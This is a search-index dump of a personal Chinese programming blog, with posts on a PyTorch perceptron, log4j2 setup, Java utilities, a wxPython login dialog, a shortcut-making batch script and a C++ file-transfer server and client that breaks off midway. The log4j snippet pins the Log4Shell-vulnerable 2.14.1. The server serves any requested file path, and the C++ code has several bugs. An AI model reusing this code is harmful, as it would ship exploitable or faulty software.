nn.BCEWithLogitsLoss() optimizer = torch.optim.SGD(mlp_net.parameters(), lr=0.01) # 创建数据集实例 train_dataset = MyDataset(X_train, y_train) # 使用DataLoader进行分批 batch_size = 64 dataloader = DataLoader(train_dataset, batch_size=batch_size, shuffle=True) epoch = 100 for i in tqdm.tqdm(range(epoch)): for batch_idx, (data_batch, target_batch) in enumerate(dataloader): # 前向传递 y = mlp_net(data_batch) target_batch = (target_batch \u0026gt; 0).to(torch.float) loss = criterion(y, target_batch) # 后向传递 optimizer.zero_grad() # 清除之前的梯度 loss.backward() # 计算loss的梯度 optimizer.step() # 反向传递 # print(f\u0026#34;epoch {i}: \\n\\t{mlp_net.state_dict()}\u0026#34;) test_dataset = MyDataset(X_test, y_test) dataloader = DataLoader(test_dataset, batch_size=batch_size, shuffle=True) mlp_net.eval() y_true = [] y_pred = [] with torch.no_grad(): for batch_idx, (data_batch, target_batch) in enumerate(dataloader): # 前向传递 y = mlp_net(data_batch) y = [-1 if yi == 0 else 1 for yi in y] y_pred.extend(y) y_true.extend(target_batch.tolist()) ac = accuracy_score(y_true, y_pred) print(f\u0026#34;{ac=}\u0026#34;) ","date":"2023年08月20日","permalink":"https://peterliuzhi.top/posts/ai%E6%84%9F%E7%9F%A5%E6%9C%BA%E4%B8%8E%E5%A4%9A%E5%B1%82%E6%84%9F%E7%9F%A5%E6%9C%BA/","section":"posts","summary":"Knowledge speaks, but wisdom listens. — Jimi Hendrix 感知机 感知机是一个简单的二分类线性分类器，是神经网络和深度学习的基石。它基于一个线性预测函数来进行预测，根据这个预测值再经过一个阈值函","tags":["杂谈","AI","机器学习","感知机","多层感知机"],"title":"【AI】感知机与多层感知机"},{"categories":["posts"],"contents":" Happiness does not come from doing easy work but from the afterglow of satisfaction that comes after the achievement of a difficult task that demanded our best. — Theodore Isaac Rubin\n添加如下依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 同时在resources文件夹下添加log4j2.xml\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!--日志级别以及优先级排序: OFF \u0026gt; FATAL \u0026gt; ERROR \u0026gt; WARN \u0026gt; INFO \u0026gt; DEBUG \u0026gt; TRACE \u0026gt; ALL --\u0026gt; \u0026lt;!--Configuration后面的status，这个用于设置log4j2自身内部的信息输出，可以不设置，当设置成trace时，你会看到log4j2内部各种详细输出--\u0026gt; \u0026lt;!--monitorInterval：Log4j能够自动检测修改配置 文件和重新配置本身，设置间隔秒数--\u0026gt; \u0026lt;configuration status=\u0026#34;WARN\u0026#34; monitorInterval=\u0026#34;30\u0026#34;\u0026gt; \u0026lt;!--先定义所有的appender--\u0026gt; \u0026lt;appenders\u0026gt; \u0026lt;!--这个输出控制台的配置--\u0026gt; \u0026lt;console name=\u0026#34;Console\u0026#34; target=\u0026#34;SYSTEM_OUT\u0026#34;\u0026gt; \u0026lt;!--输出日志的格式--\u0026gt; \u0026lt;PatternLayout pattern=\u0026#34;[%d{HH:mm:ss:SSS}] [%p] - %l - %m%n\u0026#34;/\u0026gt; \u0026lt;/console\u0026gt; \u0026lt;!--文件会打印出所有信息，这个log每次运行程序会自动清空，由append属性决定，这个也挺有用的，适合临时测试用--\u0026gt; \u0026lt;File name=\u0026#34;log\u0026#34; fileName=\u0026#34;log/test.log\u0026#34; append=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;PatternLayout pattern=\u0026#34;%d{HH:mm:ss.SSS} %-5level %class{36} %L %M - %msg%xEx%n\u0026#34;/\u0026gt; \u0026lt;/File\u0026gt; \u0026lt;!-- 这个会打印出所有的info及以下级别的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档--\u0026gt; \u0026lt;RollingFile name=\u0026#34;RollingFileInfo\u0026#34; fileName=\u0026#34;${sys:user.home}/logs/info.log\u0026#34; filePattern=\u0026#34;${sys:user.home}/logs/$${date:yyyy-MM}/info-%d{yyyy-MM-dd}-%i.log\u0026#34;\u0026gt; \u0026lt;!--控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch）--\u0026gt; \u0026lt;ThresholdFilter level=\u0026#34;info\u0026#34; onMatch=\u0026#34;ACCEPT\u0026#34; onMismatch=\u0026#34;DENY\u0026#34;/\u0026gt; \u0026lt;PatternLayout pattern=\u0026#34;[%d{HH:mm:ss:SSS}] [%p] - %l - %m%n\u0026#34;/\u0026gt; \u0026lt;Policies\u0026gt; \u0026lt;TimeBasedTriggeringPolicy/\u0026gt; \u0026lt;SizeBasedTriggeringPolicy size=\u0026#34;100 MB\u0026#34;/\u0026gt; \u0026lt;/Policies\u0026gt; \u0026lt;/RollingFile\u0026gt; \u0026lt;RollingFile name=\u0026#34;RollingFileWarn\u0026#34; fileName=\u0026#34;${sys:user.home}/logs/warn.log\u0026#34; filePattern=\u0026#34;${sys:user.home}/logs/$${date:yyyy-MM}/warn-%d{yyyy-MM-dd}-%i.log\u0026#34;\u0026gt; \u0026lt;ThresholdFilter level=\u0026#34;warn\u0026#34; onMatch=\u0026#34;ACCEPT\u0026#34; onMismatch=\u0026#34;DENY\u0026#34;/\u0026gt; \u0026lt;PatternLayout pattern=\u0026#34;[%d{HH:mm:ss:SSS}] [%p] - %l - %m%n\u0026#34;/\u0026gt; \u0026lt;Policies\u0026gt; \u0026lt;TimeBasedTriggeringPolicy/\u0026gt; \u0026lt;SizeBasedTriggeringPolicy size=\u0026#34;100 MB\u0026#34;/\u0026gt; \u0026lt;/Policies\u0026gt; \u0026lt;!-- DefaultRolloverStrategy属性如不设置，则默认为最多同一文件夹下7个文件，这里设置了20 --\u0026gt; \u0026lt;DefaultRolloverStrategy max=\u0026#34;20\u0026#34;/\u0026gt; \u0026lt;/RollingFile\u0026gt; \u0026lt;RollingFile name=\u0026#34;RollingFileError\u0026#34; fileName=\u0026#34;${sys:user.home}/logs/error.log\u0026#34; filePattern=\u0026#34;${sys:user.home}/logs/$${date:yyyy-MM}/error-%d{yyyy-MM-dd}-%i.log\u0026#34;\u0026gt; \u0026lt;ThresholdFilter level=\u0026#34;error\u0026#34; onMatch=\u0026#34;ACCEPT\u0026#34; onMismatch=\u0026#34;DENY\u0026#34;/\u0026gt; \u0026lt;PatternLayout pattern=\u0026#34;[%d{HH:mm:ss:SSS}] [%p] - %l - %m%n\u0026#34;/\u0026gt; \u0026lt;Policies\u0026gt; \u0026lt;TimeBasedTriggeringPolicy/\u0026gt; \u0026lt;SizeBasedTriggeringPolicy size=\u0026#34;100 MB\u0026#34;/\u0026gt; \u0026lt;/Policies\u0026gt; \u0026lt;/RollingFile\u0026gt; \u0026lt;/appenders\u0026gt; \u0026lt;!--然后定义logger，只有定义了logger并引入的appender，appender才会生效--\u0026gt; \u0026lt;loggers\u0026gt; \u0026lt;!--过滤掉spring和mybatis的一些无用的DEBUG信息--\u0026gt; \u0026lt;logger name=\u0026#34;org.springframework\u0026#34; level=\u0026#34;INFO\u0026#34;\u0026gt;\u0026lt;/logger\u0026gt; \u0026lt;logger name=\u0026#34;org.mybatis\u0026#34; level=\u0026#34;INFO\u0026#34;\u0026gt;\u0026lt;/logger\u0026gt; \u0026lt;root level=\u0026#34;all\u0026#34;\u0026gt; \u0026lt;appender-ref ref=\u0026#34;Console\u0026#34;/\u0026gt; \u0026lt;appender-ref ref=\u0026#34;RollingFileInfo\u0026#34;/\u0026gt; \u0026lt;appender-ref ref=\u0026#34;RollingFileWarn\u0026#34;/\u0026gt; \u0026lt;appender-ref ref=\u0026#34;RollingFileError\u0026#34;/\u0026gt; \u0026lt;/root\u0026gt; \u0026lt;/loggers\u0026gt; \u0026lt;/configuration\u0026gt; ","date":"2023年08月18日","permalink":"https://peterliuzhi.top/posts/java%E5%9C%A8pwm.xml%E4%B8%AD%E5%BC%95%E5%85%A5log4j2/","section":"posts","summary":"Happiness does not come from doing easy work but from the afterglow of satisfaction that comes after the achievement of a difficult task that demanded our best. — Theodore Isaac Rubin 添加如下依赖 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 同时在resources文件夹下添加log4j2.xml","tags":["杂谈"],"title":"【Java】在pwm.xml中引入log4j2"},{"categories":["posts"],"contents":" Fame usually comes to those who are thinking about something else. — Oliver Wendell Holmes Jr.\n引入 可以使用java.util.Properties来读取一个普通的配置文件\n配置文件示例：\nfromAddress: \u0026#34;xxx@163.com\u0026#34; Password : \u0026#34;xxx\u0026#34; toAddress: \u0026#34;xxx@qq.com\u0026#34; templateFileAddress: \u0026#34;xxx\\\\xxx\u0026#34; 代码 import java.io.FileInputStream; import java.io.IOException; import java.util.HashMap; import java.util.Properties; public class ConfigReader { private HashMap\u0026lt;String, String\u0026gt; configMap = new HashMap\u0026lt;\u0026gt;(); private String configFileName = \u0026#34;\u0026#34;; public ConfigReader(){ } public ConfigReader(String configFileName){ this.readConfig(configFileName); } public void readConfig(String configFileName) { this.configFileName = configFileName; Properties properties = new Properties(); try { FileInputStream fileInputStream = new FileInputStream(configFileName); properties.load(fileInputStream); fileInputStream.close(); } catch (IOException e) { e.printStackTrace(); } // 遍历配置项并存储到哈希表中 for (String key : properties.stringPropertyNames()) { String value = properties.getProperty(key); configMap.put(key, value); } // 打印配置项值 new LogWriter().info(configMap); } public String getConfigItem(String item){ return this.configMap.get(item); } public String[] getConfigItem(String... item){ int itemLen = item.length; String[] ret = new String[itemLen]; for (int i = 0; i \u0026lt; itemLen; ++i){ ret[i] = this.configMap.get(item[i]); } return ret; } public String[] getWholeConfig(){ int len = this.configMap.size(); String[] ret = new String[len]; String[] configKeys = this.configMap.keySet().toArray(new String[0]); String[] configVals = this.configMap.values().toArray(new String[0]); for (int i = 0; i \u0026lt; len; i++) { ret[i] = configKeys[i] + \u0026#34;=\u0026#34; + configVals[i]; } return ret; } public String[] getAllVals(){ return this.configMap.values().toArray(new String[0]); } public String[] getAllKeys(){ return this.configMap.keySet().toArray(new String[0]); } } ","date":"2023年08月18日","permalink":"https://peterliuzhi.top/posts/java%E8%AF%BB%E5%8F%96%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/","section":"posts","summary":"Fame usually comes to those who are thinking about something else. — Oliver Wendell Holmes Jr. 引入 可以使用java.util.Properties来读取一个普通的配置文件 配置文件示例： fromAddress: \u0026#34;xxx@163.com\u0026#34; Password : \u0026#34;xxx\u0026#34; toAddress: \u0026#34;xxx@qq.com\u0026#34; templateFileAddress: \u0026#34;xxx\\\\xxx\u0026#34; 代码 import java.io.FileInputStream; import","tags":["杂谈"],"title":"【Java】读取配置文件"},{"categories":["posts"],"contents":" Autumn is a second spring when every leaf is a flower. — Albert Camus\n引入 需求：\n纯粹的计时功能 计时结束时调用回调函数 基于多线程实现异步 代码 首先定义Timer类\npublic class Timer { public void alarm(long millis, Callable callable) { new Thread(new Runnable() { @Override public void run() { try { Thread.sleep(millis); } catch (Exception e) { e.printStackTrace(); } callable.call(); } }).start(); } public void wait(long millis, Callable callable) { try { Thread.sleep(millis); } catch (Exception e) { e.printStackTrace(); } callable.call(); } } 然后定义回调函数的类型，通过接口实现\npackage hundsun.email.Entity; public interface Callable { /** * 回调函数 */ public void call(); } 如果你要使用这个Timer，首先需要实现Callable接口\npublic class TestClass implements Callable { static int a = 0; @Override public void call() { a++; System.out.println(\u0026#34;Timer alarmed!\u0026#34; + a); } public static void main(String[] args) { Timer timer = new Timer(); timer.alarm(3000, new TestClass()); System.out.println(\u0026#34;-----------\u0026#34;); timer.wait(3000, new TestClass()); } } ","date":"2023年08月18日","permalink":"https://peterliuzhi.top/posts/java%E5%90%8C%E6%AD%A5%E4%B8%8E%E5%BC%82%E6%AD%A5timer/","section":"posts","summary":"Autumn is a second spring when every leaf is a flower. — Albert Camus 引入 需求： 纯粹的计时功能 计时结束时调用回调函数 基于多线程实现异步 代码 首先定义Timer类 public class Timer { public void alarm(long millis, Callable callable) { new Thread(new Runnable() { @Override public","tags":["杂谈"],"title":"【Java】同步与异步Timer"},{"categories":["posts","图形化"],"contents":" The least movement is of importance to all nature. The entire ocean is affected by a pebble. — Blaise Pascal\n继承wx.Dialog进行布局，用户点击确定的时候更改自己的成员变量：\nclass LoginDialog(wx.Dialog): def __init__(self, parent=None, compulsory_login_flag=True): super(LoginDialog, self).__init__(parent, -1, title=\u0026#39;登录SQLserver\u0026#39;, style=wx.DEFAULT_DIALOG_STYLE) self._compulsory_login_flag = compulsory_login_flag def InitUI(self, default_host, default_user, default_db, default_port): self.SetSize((250, 300)) # 操作组件 self.input_host = wx.TextCtrl(self, value=str(default_host)) self.input_name = wx.TextCtrl(self, value=str(default_user)) self.input_pass = wx.TextCtrl(self, style=wx.TE_PASSWORD) self.input_db = wx.TextCtrl(self, value=str(default_db)) self.input_port = wx.TextCtrl(self, value=str(default_port)) self.btn_1a = wx.Button(self, label=\u0026#39;登录\u0026#39;, size=(7, 35), id=wx.ID_OK) # 装饰组件 label_host = wx.StaticText(self, label=\u0026#39;服务器:\u0026#39;) label_name = wx.StaticText(self, label=\u0026#39;用户名:\u0026#39;) label_pass = wx.StaticText(self, label=\u0026#39;密码\u0026#39;) label_db = wx.StaticText(self, label=\u0026#39;初始数据库：\u0026#39;) label_port = wx.StaticText(self, label=\u0026#39;端口\u0026#39;) # panel_black = wx.Panel(self, size=(7, 15)) # panel_black.SetBackgroundColour(wx.Colour(\u0026#39;#474747\u0026#39;)) # panel_red = wx.Panel(self, size=(7, 30)) # panel_red.SetBackgroundColour(wx.Colour(\u0026#39;#bf0006\u0026#39;)) # 布局组件 fgs_2 = wx.FlexGridSizer(rows=5, cols=2, vgap=8, hgap=10) fgs_2.AddMany([ (label_host, 1, wx.LEFT, 5), (self.input_host, 1, wx.EXPAND), (label_port, 1, wx.LEFT, 5), (self.input_port, 1, wx.EXPAND), (label_name, 1, wx.LEFT, 5), (self.input_name, 1, wx.EXPAND), (label_pass, 1, wx.LEFT, 5), (self.input_pass, 1, wx.EXPAND), (label_db, 1, wx.LEFT, 5), (self.input_db, 1, wx.EXPAND), ]) fgs_2.AddGrowableCol(1) fgs_1 = wx.FlexGridSizer(rows=2, cols=1, vgap=0, hgap=0) fgs_1.AddMany([ (fgs_2, 1, wx.EXPAND | wx.TOP | wx.CENTER | wx.RIGHT | wx.LEFT, 15), (self.btn_1a, 1, wx.EXPAND | wx.ALL, 15), ]) fgs_1.AddGrowableCol(0) fgs_1.AddGrowableRow(0, 2) fgs_1.AddGrowableRow(1, 2) # fgs_1.AddGrowableRow(3, 1) # 窗口组件 self.SetSizer(fgs_1) self.Center() self.Bind(wx.EVT_CLOSE, self._justExit) self.Bind(wx.EVT_BUTTON, self._handle_before_close_dialog, id=wx.ID_OK) def _handle_before_close_dialog(self, e): if self._compulsory_login_flag: wx.Exit() else: self.loginInfo = { \u0026#39;userName\u0026#39;: self.input_name.GetValue(), \u0026#39;serverName\u0026#39;: self.input_host.GetValue(), \u0026#39;dbName\u0026#39;: self.input_db.GetValue(), \u0026#39;port\u0026#39;: self.input_port.GetValue(), \u0026#39;passWord\u0026#39;: self.input_pass.GetValue() } self.Destroy() def _justExit(self, event): self.loginInfo = False self.Destroy() 使用的时候创建对象然后调用完获取其成员变量就好：\nlogin = LoginDialog(compulsory_login_flag=False) login.InitUI(self.serverName, self.userName, self.dbName, self.port) # 初始化UI login.ShowModal() # wx.Dialog内置函数 loginInfo = login.loginInfo 整个过程很流畅，很优雅，但是我一开始没有查到（x）\n","date":"2023年07月21日","permalink":"https://peterliuzhi.top/posts/wxpython%E5%90%AF%E5%8A%A8%E5%BC%B9%E7%AA%97/","section":"posts","summary":"The least movement is of importance to all nature. The entire ocean is affected by a pebble. — Blaise Pascal 继承wx.Dialog进行布局，用户点击确定的时候更改自己的成员变量： class LoginDialog(wx.Dialog): def __init__(self, parent=None, compulsory_login_flag=True): super(LoginDialog, self).__init__(parent, -1, title=\u0026#39;","tags":["wxpython","python"],"title":"【wxpython】启动弹窗"},{"categories":["posts"],"contents":" Communications tools don\u0026rsquo;t get socially interesting until they get technologically boring. — Clay Shirky\n编写创建快捷方式的脚本 因为我的程序是用python编写的，并且使用了python嵌入式版本创建了一个独立隔离的小型python环境，因此我的程序的启动方式是一个bat文件（用来执行python命令），我希望在桌面创建一个快捷方式来快速地运行这个bat文件\n脚本的大部分内容来源windows下使用bat脚本创建桌面快捷方式_※※冰馨※※的博客-CSDN博客，可以参考 Windows VBS脚本创建快捷方式_vbs创建快捷方式_Dan淡淡的心的博客-CSDN博客\n@echo off echo 正在创建桌面快捷方式，请勿关闭本窗口. ::设置程序或文件的完整路径（必选） set Program=%cd%\\\u0026lt;程序名\u0026gt; ::设置快捷方式名称（必选） set LnkName= ::设置程序的工作路径，一般为程序主目录，此项若留空，脚本将自行分析路径 set WorkDir=%cd% ::设置图标路径 set iconPath= ::设置快捷方式显示的说明（可选） set Desc= if not defined WorkDir call:GetWorkDir \u0026#34;%Program%\u0026#34; (echo Set WshShell=CreateObject(\u0026#34;WScript.Shell\u0026#34;^) echo strDesKtop=WshShell.SpecialFolders(\u0026#34;DesKtop\u0026#34;^) :: 创建对象 echo Set oShellLink=WshShell.CreateShortcut(strDesKtop^\u0026amp;\u0026#34;\\%LnkName%.lnk\u0026#34;^) :: 设置目标目录 echo oShellLink.TargetPath=\u0026#34;%Program%\u0026#34; :: 设置工作目录 echo oShellLink.WorkingDirectory=\u0026#34;%WorkDir%\u0026#34; echo oShellLink.WindowStyle=1 :: 设置描述 echo oShellLink.Description=\u0026#34;%Desc%\u0026#34; :: 设置快捷方式图标 echo oShellLink.IconLocation=\u0026#34;%iconPath%\u0026#34; echo oShellLink.Save)\u0026gt;makelnk.vbs echo 桌面快捷方式创建成功！ :: 运行vbs脚本 makelnk.vbs :: 删除vbs脚本 del /f /q makelnk.vbs exit goto :eof :GetWorkDir set WorkDir=%~dp1 set WorkDir=%WorkDir:~,-1% goto :eof 使用winrar创建自解压文件 我们的目标是创建一个自解压的exe，然后解压完成后调用我们的安装脚本install.bat\n然后可以在高级里面设置一下自解压的选项，注意这里是最主要的，设置解压后运行的程序：\n可以设置图标、标题、描述：\n","date":"2023年07月21日","permalink":"https://peterliuzhi.top/posts/%E4%BD%BF%E7%94%A8winrar%E5%88%B6%E4%BD%9C%E8%87%AA%E8%A7%A3%E5%8E%8B%E7%AE%80%E6%98%93%E5%AE%89%E8%A3%85%E5%8C%85/","section":"posts","summary":"Communications tools don\u0026rsquo;t get socially interesting until they get technologically boring. — Clay Shirky 编写创建快捷方式的脚本 因为我的程序是用python编写的，并且使用了python嵌入式版本创建了一个独立隔离的小型pyth","tags":["杂谈"],"title":"使用winrar制作自解压安装包"},{"categories":["posts"],"contents":" The only real mistake is the one from which we learn nothing. — John Powell\n引入 在【学习记录】C\u0026amp;C++网络编程——文件传输（兼容Windows和Linux） - P3troL1er 的个人博客我提到兼容Windows和Linux太累了，所以想用C++标准库代替。但是C++暂时没有标准网络库，而且socket库在Windows和Linux差别并不大，又暂时不想引入外部库，同时代码中用到的api都还比较浅，所以暂时只能替代多线程相关的部分。\n完整代码 其实代码逻辑差别并不大，只是把能替换的C-style api全部替换成C++风格了\nserver #ifdef _WIN32 #define _CRT_SECURE_NO_WARNINGS #endif // C库 #include \u0026lt;cerrno\u0026gt; #include \u0026lt;csignal\u0026gt; #include \u0026lt;cstring\u0026gt; // C++库 #include \u0026lt;string\u0026gt; #include \u0026lt;thread\u0026gt; #include \u0026lt;chrono\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; // ---web--- #ifdef _WIN32 #include \u0026lt;winsock2.h\u0026gt; #include \u0026lt;ws2tcpip.h\u0026gt; // --- #include \u0026lt;windows.h\u0026gt; #pragma comment(lib, \u0026#34;ws2_32.lib\u0026#34;) #else #include \u0026lt;arpa/inet.h\u0026gt; // #include \u0026lt;unistd.h\u0026gt; #endif #define readonly const #define BUFSIZE 1024 // 几个宏用来防止手动写入过多错误判断代码 #define CKEX(EXP) \\ do { \\ if ((EXP)) { \\ std::cerr \u0026lt;\u0026lt; \u0026#34;[EXIT ERROR] \u0026#34; \u0026lt;\u0026lt; #EXP \u0026lt;\u0026lt; \u0026#34; raise error: \u0026#34; \u0026lt;\u0026lt; strerror(errno) \u0026lt;\u0026lt; std::endl; \\ exit(127 + errno); \\ } \\ } while (0) #define CKE(EXP) CKEX((EXP) == -1) #define CKEN(EXP) CKEX((EXP) != 0) #define CKEZ(EXP) CKEX((EXP) == 0) // 用来保存通信线程所需的相关信息 typedef struct { #ifdef _WIN32 SOCKET cfd; #else int cfd; // 通信的文件描述符 #endif // _WIN32 struct sockaddr_in details; // 客户端的相关信息 socklen_t details_len; // 上面那个结构体的长度，如果通信线程调用recvfrom就可以用到 char ip[16]; // 保存客户端的IP字符串 int port; // 保存客户端的端口 std:🧵:id tid; } netfd; static void communicate(netfd* arg) { netfd\u0026amp; netinfo = *arg; netinfo.tid = std::this_thread::get_id(); // 每个已连接的通信线程都有1kb的缓冲区 char fname[BUFSIZE] { 0 }; // 固定的回复 char response[BUFSIZE] { 0 }; // TODOrecv \u0026amp; send // 获取收到的字节数量 int len = recv(netinfo.cfd, fname, sizeof(fname) - 1, 0); if (len \u0026gt; 0) { std::cout \u0026lt;\u0026lt; \u0026#34;client from \u0026#34; \u0026lt;\u0026lt; netinfo.ip \u0026lt;\u0026lt; \u0026#39;:\u0026#39; \u0026lt;\u0026lt; netinfo.port \u0026lt;\u0026lt; \u0026#34; ask for file: \u0026#34; \u0026lt;\u0026lt; fname \u0026lt;\u0026lt; std::endl; std::ifstream inFile(fname, std::ios::in | std::ios::binary); CKEX(!inFile.is_open()); while (!inFile.eof()) { inFile.read(response, BUFSIZE); send(netinfo.cfd, response, sizeof(char) * (inFile.gcount()), 0); } std::cout \u0026lt;\u0026lt; \u0026#34;Transformation Done!\u0026#34; \u0026lt;\u0026lt; std::endl; inFile.close(); } else if (len == 0) { // TODO接收到客户端终止连接请求 std::cerr \u0026lt;\u0026lt; \u0026#34;the client has ended the connection...\u0026#34; \u0026lt;\u0026lt; std::endl; } else { // 接收到错误就打印出来，并且退出线程 std::cerr \u0026lt;\u0026lt; \u0026#34;[EXIT ERROR] recv() raise error: \u0026#34; \u0026lt;\u0026lt; strerror(errno) \u0026lt;\u0026lt; std::endl; } std::cout \u0026lt;\u0026lt; \u0026#34;exiting thread \u0026#34; \u0026lt;\u0026lt; netinfo.tid \u0026lt;\u0026lt; \u0026#34; (communication with \u0026#34; \u0026lt;\u0026lt; netinfo.ip \u0026lt;\u0026lt; \u0026#39;:\u0026#39; \u0026lt;\u0026lt; netinfo.port \u0026lt;\u0026lt; \u0026#34;)...\u0026#34; \u0026lt;\u0026lt; std::endl; delete \u0026amp;netinfo; #ifdef _WIN32 closesocket(netinfo.cfd); #else close(netinfo.cfd); #endif // _WIN32 } int main(int argc, char const* argv[]) { // 解除std::cout和std::cin之间的同步 std::ios_base::sync_with_stdio(false); int port = 10000; if (argc \u0026gt;= 2) { std::string tmp(argv[1]); port = std::stoi(tmp); } // 声明局部变量 #ifdef _WIN32 SOCKET lfd; WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), \u0026amp;wsaData); #else int lfd; #endif // _WIN32 struct sockaddr_in server_addr; // 保存服务器的相关信息 constexpr readonly int connection_num = 8; // 设置最大连接数 // 设置信号处理函数 auto sig_int = [](int signo) -\u0026gt; void { std::cout \u0026lt;\u0026lt; \u0026#34;thread \u0026#34; \u0026lt;\u0026lt; std::this_thread::get_id() \u0026lt;\u0026lt; \u0026#34;received: \u0026#34;; #ifdef _WIN32 std::cout \u0026lt;\u0026lt; _sys_errlist[signo] \u0026lt;\u0026lt; std::endl; #else std::cout \u0026lt;\u0026lt; strsignal(signo) \u0026lt;\u0026lt; std::endl; #endif // _WIN32 std::cout \u0026lt;\u0026lt; \u0026#34;server exiting...\u0026#34; \u0026lt;\u0026lt; std::endl; exit(signo); }; signal(SIGINT, sig_int); // TODO设置监听的套接字 // 设置TCP协议 CKE(lfd = socket(AF_INET, SOCK_STREAM, 0)); // TODO绑定端口 server_addr.sin_family = AF_INET; // from host byte order to network byte order server_addr.sin_port = htons(port); // 代表本机的任意地址 // 或者设置其中一个IP，使用inet_pton将IP地址字符串转换为二进制格式 // inet_pton - convert IPv4 and IPv6 addresses from text to binary form server_addr.sin_addr.s_addr = INADDR_ANY; CKEN(bind(lfd, (struct sockaddr*)\u0026amp;server_addr, sizeof(server_addr))); // TODO设置端口监听 CKEN(listen(lfd, connection_num)); // TODO开始接收连接请求 // 阻塞直到有客户端连接 // 在栈空间中保存该结构体的大小，因为后面的api需要传指针进去，可能会更改这个值 // 不停地检测是否有连接 // 如果没有连接就阻塞 while (true) { // 这个结构体包括了传给线程的参数，因此不能是局部变量，可以在堆上分配 netfd* netinfo = new netfd; netinfo-\u0026gt;details_len = sizeof(netinfo-\u0026gt;details); /** On success, these system calls return a file descriptor for the accepted socket (a nonnegative integer). On error, -1 is returned, errno is set appropriately, and addrlen is left unchanged. */ CKE(netinfo-\u0026gt;cfd = accept(lfd, (struct sockaddr*)\u0026amp;(netinfo-\u0026gt;details), \u0026amp;(netinfo-\u0026gt;details_len))); // 此时应该已经收到了客户端的相关信息 netinfo-\u0026gt;port = ntohs(netinfo-\u0026gt;details.sin_port); #ifdef _WIN32 inet_ntop(AF_INET, \u0026amp;(netinfo-\u0026gt;details.sin_addr), netinfo-\u0026gt;ip, netinfo-\u0026gt;details_len); #else inet_ntop(AF_INET, \u0026amp;(netinfo-\u0026gt;details.sin_addr.s_addr), netinfo-\u0026gt;ip, netinfo-\u0026gt;details_len); #endif // _WIN32 // 打印客户端相关信息 std::cout \u0026lt;\u0026lt; \u0026#34;client\u0026#39;s IP: \u0026#34; \u0026lt;\u0026lt; netinfo-\u0026gt;ip \u0026lt;\u0026lt; \u0026#34;, port: \u0026#34; \u0026lt;\u0026lt; netinfo-\u0026gt;port \u0026lt;\u0026lt; std::endl; // 创建信息 std::thread t(communicate, netinfo); t.detach(); } // TODO关闭两个端口 // 在主线程只用关闭监听的文件描述符 #ifdef _WIN32 closesocket(lfd); WSACleanup(); #else close(lfd); #endif // _WIN32 return 0; } client #ifdef _WIN32 #define _CRT_SECURE_NO_WARNINGS #endif #include \u0026lt;cerrno\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;climits\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;filesystem\u0026gt; #ifdef _WIN32 #include \u0026lt;winsock2.h\u0026gt; #include \u0026lt;ws2tcpip.h\u0026gt; // --- #include \u0026lt;windows.h\u0026gt; #pragma comment(lib, \u0026#34;ws2_32.lib\u0026#34;) #define REMOTE_PATH_SEP \u0026#39;/\u0026#39; #else #include \u0026lt;arpa/inet.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define REMOTE_PATH_SEP \u0026#39;\\\\\u0026#39; #endif #define LOCAL_PATH_SEP std::filesystem::path::preferred_separator #define readonly const // 几个宏用来防止手动写入过多错误判断代码 #define CKEX(EXP) \\ do { \\ if ((EXP)) { \\ std::cerr \u0026lt;\u0026lt; \u0026#34;[EXIT ERROR] \u0026#34; \u0026lt;\u0026lt; #EXP \u0026lt;\u0026lt; \u0026#34; raise error: \u0026#34; \u0026lt;\u0026lt; strerror(errno) \u0026lt;\u0026lt; std::endl; \\ exit(127 + errno); \\ } \\ } while (0) #define CKE(EXP) CKEX((EXP) == -1) #define CKEN(EXP) CKEX((EXP) != 0) #define CKEZ(EXP) CKEX((EXP) == 0) int main(int argc, char const* argv[]) { std::ios_base::sync_with_stdio(false); if (argc \u0026lt; 3) { std::cerr \u0026lt;\u0026lt; \u0026#34;Usage: \u0026#34; \u0026lt;\u0026lt; argv[0] \u0026lt;\u0026lt; \u0026#34; \u0026lt;IP address\u0026gt; \u0026lt;filename\u0026gt;\u0026#34; \u0026lt;\u0026lt; std::endl; exit(127); } std::string IP = argv[1]; // 尝试从IP中分离出port size_t port_place = IP.find(\u0026#39;:\u0026#39;); int port = 10000; if (port_place != std::string::npos) { IP = IP.substr(0, port_place); port_place++; port = std::stoi(IP.substr(port_place)); } std::string fname = argv[2]; size_t sep_place = fname.rfind(REMOTE_PATH_SEP) + 1; if (sep_place == std::string::npos) { sep_place = 0; } int path_ptr = 0; std::filesystem::path currentPath = std::filesystem::current_path(); std::string path = currentPath.generic_string(); path += LOCAL_PATH_SEP; path += fname.substr(sep_place); readonly char* store_fname = path.c_str(); std::cout \u0026lt;\u0026lt; \u0026#34;Writing to 